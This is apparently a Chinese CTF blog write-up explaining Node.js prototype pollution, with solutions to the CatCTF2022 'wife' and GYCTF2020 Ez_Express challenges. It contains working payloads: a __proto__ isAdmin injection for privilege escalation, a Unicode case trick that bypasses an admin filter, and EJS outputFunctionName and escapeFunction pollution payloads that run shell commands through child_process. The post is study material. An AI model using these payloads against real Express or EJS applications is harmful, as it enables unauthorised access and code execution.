---
title: nodejs原型链污染
date: 2026-03-04 18:10:19
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/image-20260316204350339.png
categories: CTF
---

java学不明白跑来学js了 :(

## 前置知识

js中每个函数实际上都是一个Function对象，所以一个方法的原型就是一个方法对象

每个实例对象都有一个私有属性(\_proto\_)指向它的构造函数的原型对象(prototype)。当一个类实例化的时候，赋值的变量会继承prototype的所有内容，包括变量以及方法

![image-20260305213411705](https://gitee.com/bobrocket/img/raw/master/img/image-20260305213411705.png)

那么我们不难总结出：

1.prototype是一个类的属性，当该类实例化时会继承prototype的所有内容

2.\_proto\_属性指向当前对象的所在类的prototype

### 什么是原型链

![image-20260305213721260](https://gitee.com/bobrocket/img/raw/master/img/image-20260305213721260.png)

### 什么是原型链污染

![image-20260305213752335](https://gitee.com/bobrocket/img/raw/master/img/image-20260305213752335.png)

当\_proto\_被作为有效键名赋值时，便能形成原型链污染攻击。

### 参考文献

[浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/361333.html)

[原型链污染 - 波波sama - 博客园](https://www.cnblogs.com/ctfer001/p/18584916)

## 实战

### [CatCTF2022]wife

进来是注册登录页面，注册admin需要邀请码，普通用户登录是这样的

![image-20260307193824548](https://gitee.com/bobrocket/img/raw/master/img/image-20260307193824548.png)

那么就需要越权拿到admin权限，注册的时候抓一下包

![image-20260307201708036](https://gitee.com/bobrocket/img/raw/master/img/image-20260307201708036.png)

这里直接修改isAdmin不行，黑盒测试还是有些难了

看一下源码

```js
app.post('/register', (req, res) => {
    let user = JSON.parse(req.body)
    if (!user.username || !user.password) {
        return res.json({ msg: 'empty username or password', err: true })
    }
    if (users.filter(u => u.username == user.username).length) {
        return res.json({ msg: 'username already exists', err: true })
    }
    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
        user.isAdmin = false
        return res.json({ msg: 'invalid invite code', err: true })
    }
    let newUser = Object.assign({}, baseUser, user)
    users.push(newUser)
    res.json({ msg: 'user created successfully', err: false })
})
```

这里Object.assign是可以触发原型链污染的

```
{"username":"sun","password":"123","__proto__":{"isAdmin":true}}
```

![image-20260307203950831](https://gitee.com/bobrocket/img/raw/master/img/image-20260307203950831.png)

### [GYCTF2020]Ez_Express

进去是一个注册登录页面，扫一下目录发现有www.zip

```js
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}

router.get('/', function (req, res) {
  if(!req.session.user){
    res.redirect('/login');
  }
  res.outputFunctionName=undefined;
  res.render('index',data={'user':req.session.user.user});
});


router.get('/login', function (req, res) {
  res.render('login');
});



router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
router.post('/action', function (req, res) {
  if(req.session.user.user!="ADMIN"){res.end("<script>alert('ADMIN is asked');history.go(-1);</script>")} 
  req.session.user.data = clone(req.body);
  res.end("<script>alert('success');history.go(-1);</script>");  
});
router.get('/info', function (req, res) {
  res.render('index',data={'user':res.outputFunctionName});
})
module.exports = router;
```

我们发现了递归合并函数，不难推测是nodejs原型链污染

在action路由下对merge进行调用，但是会校验身份admin

[Fuzz中的javascript大小写特性 | 离别歌](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)

我们用`admın`作为用户名进行注册，也是成功进去了

下一步就是原型链污染了

可以看到在`/info`下，使用将`outputFunctionName`渲染入`index`中，而`outputFunctionName`是未定义的

```json
{
  "__proto__": {
    "outputFunctionName": "x=1; return process.mainModule.require('child_process').execSync('cat /flag').toString(); //"
  }
}
```

EJS 会使用 `escapeFunction` 来处理模板中的变量。如果污染这个属性，你可以直接执行代码。

```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1; return process.mainModule.require('child_process').execSync('cat /flag').toString();"
  }
}
```

